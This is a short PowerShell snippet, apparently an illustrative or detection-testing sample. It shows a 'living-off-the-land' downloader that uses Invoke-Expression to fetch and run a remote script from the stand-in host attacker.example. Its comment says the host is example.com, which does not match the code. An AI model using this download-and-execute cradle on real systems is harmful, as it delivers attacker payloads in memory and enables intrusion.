# Defanged PowerShell living-off-the-land downloader.
# Real samples target Cobalt-Strike beacons; this points at example.com.
$url = "https://attacker.example/stage1.ps1"
IEX (New-Object Net.WebClient).DownloadString($url)
